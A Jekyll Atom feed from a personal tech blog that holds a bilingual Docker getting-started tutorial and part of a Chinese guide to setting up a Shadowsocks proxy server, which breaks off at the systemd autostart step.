<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-04-04T18:37:54+08:00</updated><id>http://localhost:4000/atom.xml</id><title type="html">Rengui’s Notes</title><subtitle>Life doesn't just happen to you; you receive everything in your life based on what you've given. 生命中的一切都不是巧合，你得到什么，是源于你付出了什么。</subtitle><author><name>Zhao Rengui</name></author><entry><title type="html">Docker notes</title><link href="http://localhost:4000/software/2019/07/11/docker/" rel="alternate" type="text/html" title="Docker notes" /><published>2019-07-11T00:00:00+08:00</published><updated>2019-07-11T00:00:00+08:00</updated><id>http://localhost:4000/software/2019/07/11/docker</id><content type="html" xml:base="http://localhost:4000/software/2019/07/11/docker/">&lt;h1 id=&quot;docker简介&quot;&gt;Docker简介&lt;/h1&gt;
&lt;h2 id=&quot;什么是-docker&quot;&gt;什么是 Docker？&lt;/h2&gt;
&lt;p&gt;Docker 是个划时代的开源项目，它彻底释放了计算虚拟化的威力，极大提高了应用的维护效率，降低了云计算应用开发的成本！使用 Docker，可以让应用的部署、测试和分发都变得前所未有的高效和轻松！
无论是应用开发者、运维人员、还是其他信息技术从业人员，都有必要认识和掌握 Docker，节约有限的生命。&lt;/p&gt;
&lt;h2 id=&quot;为什么要使用-docker&quot;&gt;为什么要使用 Docker？&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;更高效的利用系统资源&lt;/li&gt;
  &lt;li&gt;更快速的启动时间&lt;/li&gt;
  &lt;li&gt;一致的运行环境&lt;/li&gt;
  &lt;li&gt;持续交付和部署&lt;/li&gt;
  &lt;li&gt;更轻松的迁移&lt;/li&gt;
  &lt;li&gt;更轻松的维护和扩展&lt;/li&gt;
  &lt;li&gt;对比传统虚拟机总结&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;特性&lt;/th&gt;
      &lt;th&gt;容器&lt;/th&gt;
      &lt;th&gt;虚拟机&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;启动&lt;/td&gt;
      &lt;td&gt;秒级&lt;/td&gt;
      &lt;td&gt;分钟级&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;硬盘使用&lt;/td&gt;
      &lt;td&gt;一般为 MB&lt;/td&gt;
      &lt;td&gt;一般为 GB&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;性能&lt;/td&gt;
      &lt;td&gt;接近原生&lt;/td&gt;
      &lt;td&gt;弱于&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;系统支持量&lt;/td&gt;
      &lt;td&gt;单机支持上千个容器&lt;/td&gt;
      &lt;td&gt;一般几十个&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;基本概念&quot;&gt;基本概念&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;镜像(Image)
Docker 镜像，就相当于是一个 root 文件系统。比如官方镜像 ubuntu:18.04 就包含了完整的一套 Ubuntu 18.04 最小系统的 root 文件系统。
Docker 镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。&lt;/li&gt;
  &lt;li&gt;分层存储
Docker 利用了 &lt;a href=&quot;https://en.wikipedia.org/wiki/Union_mount&quot;&gt;Union FS&lt;/a&gt; 的技术，将其设计为分层存储的架构。所以严格来说，镜像并非是像一个 ISO 那样的打包文件，镜像只是一个虚拟的概念，其实际体现并非由一个文件组成，而是由一组文件系统组成，或者说，由多层文件系统联合组成。
镜像构建时，会一层层构建，前一层是后一层的基础。在构建镜像的时候，需要额外小心，每一层尽量只包含该层需要添加的东西，任何额外的东西应该在该层构建结束前清理掉。&lt;/li&gt;
  &lt;li&gt;容器(Container)
容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。
容器内的进程是运行在一个隔离的环境里，使用起来，就好像是在一个独立于宿主的系统下操作一样。
每一个容器运行时，是以镜像为基础层，在其上创建一个当前容器的存储层，我们可以称这个为容器运行时读写而准备的存储层为容器存储层。&lt;/li&gt;
  &lt;li&gt;仓库(Repository)
&lt;strong&gt;Docker Registry&lt;/strong&gt;
&lt;a href=&quot;https://yeasy.gitbooks.io/docker_practice/content/repository/registry.html&quot;&gt;Docker Registry&lt;/a&gt; 中可以包含多个仓库（Repository）；每个仓库可以包含多个标签（Tag）；每个标签对应一个镜像。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Docker Registry 公开服务&lt;/strong&gt;
开放给用户使用、允许用户管理镜像的 Registry 服务。一般这类公开服务允许用户免费上传、下载公开的镜像，并可能提供收费服务供用户管理私有镜像。
最常使用的 Registry 公开服务&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;官方的 &lt;a href=&quot;https://hub.docker.com/&quot;&gt;Docker Hub&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://coreos.com/&quot;&gt;CoreOS&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://quay.io/repository/&quot;&gt;Quay.io&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;时速云镜像仓库&lt;/li&gt;
  &lt;li&gt;网易云镜像服务&lt;/li&gt;
  &lt;li&gt;DaoCloud 镜像市场&lt;/li&gt;
  &lt;li&gt;阿里云镜像库&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;由于某些原因，在国内访问这些服务可能会比较慢。国内的一些云服务商提供了针对 Docker Hub 的镜像服务（Registry Mirror），这些镜像服务被称为加速器。常见的有：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://cr.console.aliyun.com/#/accelerator&quot;&gt;阿里云加速器&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.daocloud.io/mirror#accelerator-doc&quot;&gt;DaoCloud 加速器&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;install-docker-ce&quot;&gt;Install Docker CE&lt;/h1&gt;
&lt;h2 id=&quot;ubuntu&quot;&gt;Ubuntu&lt;/h2&gt;
&lt;h3 id=&quot;installation&quot;&gt;Installation&lt;/h3&gt;
&lt;ol&gt;
  &lt;li&gt;Uninstall old versions
    &lt;blockquote&gt;
      &lt;p&gt;$ sudo apt remove docker docker-engine docker.io containerd runc&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;Install packages to allow apt to use a repository over HTTPS:
    &lt;blockquote&gt;
      &lt;p&gt;$ sudo apt update
$ sudo apt-get install \
apt-transport-https \
ca-certificates \
curl \
gnupg-agent \
software-properties-common&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;Add Docker’s official GPG key:
    &lt;blockquote&gt;
      &lt;p&gt;$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
Verify that you now have the key with the fingerprint 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88, by searching for the last 8 characters of the fingerprint.
sudo apt-key fingerprint 0EBFCD88
pub   rsa4096 2017-02-22 [SCEA]
   9DC8 5822 9FC7 DD38 854A  E2D8 8D81 803C 0EBF CD88
uid           [ unknown] Docker Release (CE deb) &lt;a href=&quot;mailto:docker@docker.com&quot;&gt;docker@docker.com&lt;/a&gt;
sub   rsa4096 2017-02-22 [S]&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;Use the following command to set up the stable repository.
    &lt;blockquote&gt;
      &lt;p&gt;$ sudo add-apt-repository \
“deb [arch=amd64] https://download.docker.com/linux/ubuntu \
$(lsb_release -cs) \
stable”&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;Install the latest version of Docker CE and containerd, or go to the next step to install a specific version:
    &lt;blockquote&gt;
      &lt;p&gt;$ sudo apt-get install docker-ce docker-ce-cli containerd.io&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;To install a specific version of Docker CE, list the available versions in the repo, then select and install:
    &lt;ul&gt;
      &lt;li&gt;List the versions available in your repo:
        &lt;blockquote&gt;
          &lt;p&gt;$ apt-cache madison docker-ce&lt;/p&gt;
        &lt;/blockquote&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;ul&gt;
  &lt;li&gt;Install a specific version using the version string from the second column, for example,
    &lt;blockquote&gt;
      &lt;p&gt;$ sudo apt-get install docker-ce=&lt;VERSION_STRING&gt; docker-ce-cli=&lt;VERSION_STRING&gt; containerd.io&lt;/VERSION_STRING&gt;&lt;/VERSION_STRING&gt;&lt;/p&gt;
      &lt;ol&gt;
        &lt;li&gt;Verify that Docker CE is installed correctly by running the hello-world image.
$ sudo docker run hello-world&lt;/li&gt;
        &lt;li&gt;Test Docker Version and Installation
// List Docker CLI commands
$ docker
$ docker container –help&lt;/li&gt;
      &lt;/ol&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;// Display Docker version and info
$ sudo docker –version
$ sudo docker version
$ sudo docker info&lt;/p&gt;
  &lt;ol&gt;
    &lt;li&gt;Uninstall Docker CE
// Uninstall the Docker CE package
$ sudo apt purge docker-ce
// Images, containers, volumes, or customized configuration files on your host are not automatically removed. To delete all images, containers, and volumes:
$ sudo rm -rf /var/lib/docker&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;get-started-with-docker&quot;&gt;Get Started with Docker&lt;/h2&gt;
&lt;h3 id=&quot;define-a-container-with-dockerfile&quot;&gt;Define a container with Dockerfile&lt;/h3&gt;
&lt;ol&gt;
  &lt;li&gt;Create an empty directory on your local machine. Change directories (cd) into the new directory, create a file called Dockerfile
    &lt;blockquote&gt;
      &lt;p&gt;$ vim Dockerfile&lt;/p&gt;
      &lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Use an official Python runtime as a parent image&lt;/span&gt;
FROM python:3.7-slim
&lt;span class=&quot;c&quot;&gt;# Set the working directory to /app&lt;/span&gt;
WORKDIR /app
&lt;span class=&quot;c&quot;&gt;# Copy the current directory contents into the container at /app&lt;/span&gt;
COPY &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; /app
&lt;span class=&quot;c&quot;&gt;# Install any needed packages specified in requirements.txt&lt;/span&gt;
RUN pip install &lt;span class=&quot;nt&quot;&gt;--trusted-host&lt;/span&gt; pypi.python.org &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; requirements.txt
&lt;span class=&quot;c&quot;&gt;# Make port 80 available to the world outside this container&lt;/span&gt;
EXPOSE 80
&lt;span class=&quot;c&quot;&gt;# Define environment variable&lt;/span&gt;
ENV NAME World
&lt;span class=&quot;c&quot;&gt;# Run app.py when the container launches&lt;/span&gt;
CMD &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;python&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;app.py&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;      &lt;/div&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;Create two more files, requirements.txt and app.py
    &lt;blockquote&gt;
      &lt;p&gt;$ vim requirements.txt&lt;/p&gt;
      &lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Flask
Redis
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;      &lt;/div&gt;
      &lt;p&gt;$ vim app.py
```shell
from flask import Flask
from redis import Redis, RedisError
import os
import socket&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;connect-to-redis&quot;&gt;Connect to Redis&lt;/h1&gt;
&lt;p&gt;redis = Redis(host=”redis”, db=0, socket_connect_timeout=2, socket_timeout=2)&lt;/p&gt;

&lt;p&gt;app = Flask(&lt;strong&gt;name&lt;/strong&gt;)&lt;/p&gt;

&lt;p&gt;@app.route(“/”)
def hello():
    try:
        visits = redis.incr(“counter”)
    except RedisError:
        visits = “&lt;i&gt;cannot connect to Redis, counter disabled&lt;/i&gt;”&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;html = &quot;&amp;lt;h3&amp;gt;Hello {name}!&amp;lt;/h3&amp;gt;&quot; \
       &quot;&amp;lt;b&amp;gt;Hostname:&amp;lt;/b&amp;gt; {hostname}&amp;lt;br/&amp;gt;&quot; \
       &quot;&amp;lt;b&amp;gt;Visits:&amp;lt;/b&amp;gt; {visits}&quot;
return html.format(name=os.getenv(&quot;NAME&quot;, &quot;world&quot;), hostname=socket.gethostname(), visits=visits)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;if &lt;strong&gt;name&lt;/strong&gt; == “&lt;strong&gt;main&lt;/strong&gt;”:
    app.run(host=’0.0.0.0’, port=80)&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;3. Installs the Flask and Redis libraries for Python
&amp;gt; $ sudo pip install -r requirements.txt
4. Build the app
&amp;gt; $ ls
&amp;gt; // Create image using this directory's Dockerfile
&amp;gt; $ sudo docker build --tag=friendlyhello .
&amp;gt; // List all images on this machine
&amp;gt; $ sudo docker image ls
5. Proxy server settings
```shell
# Proxy server settings
# Proxy servers can block connections to your web app once it’s up and running. If you are behind a proxy server, add the following lines to your Dockerfile, using the ENV command to specify the host and port for your proxy servers:
# Set proxy server, replace host:port with values for your servers
ENV http_proxy host:port
ENV https_proxy host:port
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ol&gt;
  &lt;li&gt;DNS settings
    &lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# DNS settings&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# DNS misconfigurations can generate problems with pip. You need to set your own DNS server address to make pip work properly. You might want to change the DNS settings of the Docker daemon. You can edit (or create) the configuration file at /etc/docker/daemon.json with the dns key, as following:&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;s2&quot;&gt;&quot;dns&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;your_dns_address&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;8.8.8.8&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Before proceeding, save daemon.json and restart the docker service.
    &lt;blockquote&gt;
      &lt;p&gt;$ sudo service docker restart&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;Run the app
    &lt;blockquote&gt;
      &lt;p&gt;// Run the app, mapping your machine’s port 4000 to the container’s published port 80 using -p:
$ sudo docker run -p 4000:80 friendlyhello
// Let’s run the app in the background, in detached mode:
$ sudo docker run -d -p 4000:80 friendlyhello&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Go to that URL in a web browser to see the display content served up on a web page.&lt;/p&gt;

&lt;h3 id=&quot;share-your-image&quot;&gt;Share your image&lt;/h3&gt;
&lt;ol&gt;
  &lt;li&gt;Log in with your Docker ID
If you don’t have a Docker account, sign up for one at &lt;a href=&quot;https://hub.docker.com/&quot;&gt;hub.docker.com&lt;/a&gt;. Make note of your username.
Log in to the Docker public registry on your local machine.
    &lt;blockquote&gt;
      &lt;p&gt;$ sudo docker login&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;Tag the image
    &lt;blockquote&gt;
      &lt;p&gt;// Run docker tag image with your username, repository, and tag names so that the image uploads to your desired destination. The syntax of the command is:
docker tag &amp;lt;image&amp;gt; username/repository:tag
// For example:
$ sudo docker tag friendlyhello gordon/get-started:part2&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;Publish the image
    &lt;blockquote&gt;
      &lt;p&gt;// Upload your tagged image to the repository:
$ sudo docker push username/repository:tag
// Pull and run the image from the remote repository
docker run -p 4000:80 username/repository:tag
$ sudo docker run -p 4000:80 gordon/get-started:part2&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;recap-and-cheat-sheetoptional&quot;&gt;Recap and cheat sheet(optional)&lt;/h3&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker build &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; friendlyhello &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;# Create image using this directory's Dockerfile&lt;/span&gt;
docker run &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 4000:80 friendlyhello  &lt;span class=&quot;c&quot;&gt;# Run &quot;friendlyhello&quot; mapping port 4000 to 80&lt;/span&gt;
docker run &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 4000:80 friendlyhello         &lt;span class=&quot;c&quot;&gt;# Same thing, but in detached mode&lt;/span&gt;
docker container &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;                                &lt;span class=&quot;c&quot;&gt;# List all running containers&lt;/span&gt;
docker container &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;             &lt;span class=&quot;c&quot;&gt;# List all containers, even those not running&lt;/span&gt;
docker container stop &amp;lt;&lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;           &lt;span class=&quot;c&quot;&gt;# Gracefully stop the specified container&lt;/span&gt;
docker container &lt;span class=&quot;nb&quot;&gt;kill&lt;/span&gt; &amp;lt;&lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;c&quot;&gt;# Force shutdown of the specified container&lt;/span&gt;
docker container rm &amp;lt;&lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;# Remove specified container from this machine&lt;/span&gt;
docker container rm &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;docker container &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;         &lt;span class=&quot;c&quot;&gt;# Remove all containers&lt;/span&gt;
docker image &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;                             &lt;span class=&quot;c&quot;&gt;# List all images on this machine&lt;/span&gt;
docker image rm &amp;lt;image id&amp;gt;            &lt;span class=&quot;c&quot;&gt;# Remove specified image from this machine&lt;/span&gt;
docker image rm &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;docker image &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;# Remove all images from this machine&lt;/span&gt;
docker login             &lt;span class=&quot;c&quot;&gt;# Log in this CLI session using your Docker credentials&lt;/span&gt;
docker tag &amp;lt;image&amp;gt; username/repository:tag  &lt;span class=&quot;c&quot;&gt;# Tag &amp;lt;image&amp;gt; for upload to registry&lt;/span&gt;
docker run username/repository:tag                   &lt;span class=&quot;c&quot;&gt;# Run image from a registry&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://yeasy.gitbooks.io/docker_practice/content/&quot;&gt;Docker — 从入门到实践&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Union_mount&quot;&gt;Union FS&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>zrg</name></author><category term="Docker" /><summary type="html">Docker简介 什么是 Docker？ Docker 是个划时代的开源项目，它彻底释放了计算虚拟化的威力，极大提高了应用的维护效率，降低了云计算应用开发的成本！使用 Docker，可以让应用的部署、测试和分发都变得前所未有的高效和轻松！ 无论是应用开发者、运维人员、还是其他信息技术从业人员，都有必要认识和掌握 Docker，节约有限的生命。 为什么要使用 Docker？ 更高效的利用系统资源 更快速的启动时间 一致的运行环境 持续交付和部署 更轻松的迁移 更轻松的维护和扩展 对比传统虚拟机总结</summary></entry><entry><title type="html">使用 Shadowsocks + SwitchyOmega 科学上网</title><link href="http://localhost:4000/network/software/2019/06/23/shadowsocks-switchyOmega-cn/" rel="alternate" type="text/html" title="使用 Shadowsocks + SwitchyOmega 科学上网" /><published>2019-06-23T00:00:00+08:00</published><updated>2019-06-23T00:00:00+08:00</updated><id>http://localhost:4000/network/software/2019/06/23/shadowsocks-switchyOmega-cn</id><content type="html" xml:base="http://localhost:4000/network/software/2019/06/23/shadowsocks-switchyOmega-cn/">&lt;p&gt;
本文内容仅作交流学习和查阅技术资料之用，请勿用于商业用途！如造成任何后果，本文作者概不负责。谢谢您的关注！
&lt;/p&gt;

&lt;div class=&quot;org-center&quot;&gt;
&lt;p&gt;
如果您有任何问题或建议，可以发送邮件到 zrg1390556487@gmail.com
&lt;/p&gt;
&lt;/div&gt;

&lt;div id=&quot;outline-container-org6cebaac&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org6cebaac&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; 服务端&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgdae77d7&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgdae77d7&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; 服务部署第一步&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
&lt;p&gt;
首先，购买一台境外云服务器
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;搬瓦工&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.digitalocean.com&quot;&gt;DigitalOcean&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;AWS&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vultr.com&quot;&gt;Vultr&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgd3325fa&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgd3325fa&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.2&lt;/span&gt; 安装和配置 Shadowsocks&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
安装 pip
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
// CentOS
# yum install python-pip

&lt;/pre&gt;
&lt;p&gt;
或者:
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# curl &quot;https://bootstrap.pypa.io/get-pip.py&quot; -o &quot;get-pip.py&quot;
# python get-pip.py

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
安装及配置 shadowsocks
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
// 使用 pip 安装 shadowsocks
# pip install shadowsocks

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 也可以选择自动安装脚本

&lt;/pre&gt;
&lt;p&gt;
&lt;a href=&quot;https://github.com/zhaorengui/article/blob/master/network/install-shadowsocks.sh&quot;&gt;install-shadowsocks.sh&lt;/a&gt;
&lt;/p&gt;

&lt;pre class=&quot;example&quot;&gt;
// 配置 shadowsocks
# vim /etc/shadowsocks.json

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot;&gt;{
  &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;server&quot;&lt;/span&gt;: &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;123.123.123.123&quot;&lt;/span&gt;,
  &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;server_port&quot;&lt;/span&gt;: 8388,
  &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;local_address&quot;&lt;/span&gt;:&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;,
  &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;local_port&quot;&lt;/span&gt;:1080,
  &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;port_password&quot;&lt;/span&gt;:{
          &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;9001&quot;&lt;/span&gt;:&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;password9001&quot;&lt;/span&gt;,
          &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;9002&quot;&lt;/span&gt;:&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;password9002&quot;&lt;/span&gt;,
          &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;9003&quot;&lt;/span&gt;:&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;password9003&quot;&lt;/span&gt;
     },
  &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;password&quot;&lt;/span&gt;: &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;password&quot;&lt;/span&gt;,
  &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;method&quot;&lt;/span&gt;: &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;aes-256-cfb&quot;&lt;/span&gt;,
  &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;timeout&quot;&lt;/span&gt;:600
}
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-txt&quot;&gt;解释: 
- &quot;server&quot;: &quot;123.123.123.123&quot; :: 服务器 IP 地址
- &quot;server_port&quot;: 8388 :: 服务器端口号
- &quot;local_address&quot;:&quot;127.0.0.1&quot; :: 本地回环地址
- &quot;local_port&quot;:1080, :: 本地端口号
- &quot;port_password&quot; :: 映射端口和密码
- &quot;password&quot;: &quot;password&quot; :: 密码
- &quot;method&quot;: &quot;aes-256-cfb&quot; :: 加密方式，详细可参考 [[http://ucdok.com/project/generate_password.html][password tool]]
- &quot;timeout&quot;:600 :: 超时时间
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;
配置自启动脚本
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# vim /etc/systemd/system/shadowsocks.service

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot;&gt;[Unit]
&lt;span style=&quot;color: #FF8C00;&quot;&gt;Description&lt;/span&gt;=Shadowsocks

[Service]
&lt;span style=&quot;color: #FF8C00;&quot;&gt;TimeoutStartSec&lt;/span&gt;=0
&lt;span style=&quot;color: #FF8C00;&quot;&gt;ExecStart&lt;/span&gt;=/usr/bin/ssserver -c /etc/shadowsocks.json

[Install]
&lt;span style=&quot;color: #FF8C00;&quot;&gt;WantedBy&lt;/span&gt;=multi-user.target
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;
设置 shadowsocks 自启动
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# systemctl enable shadowsocks
# systemctl start shadowsocks
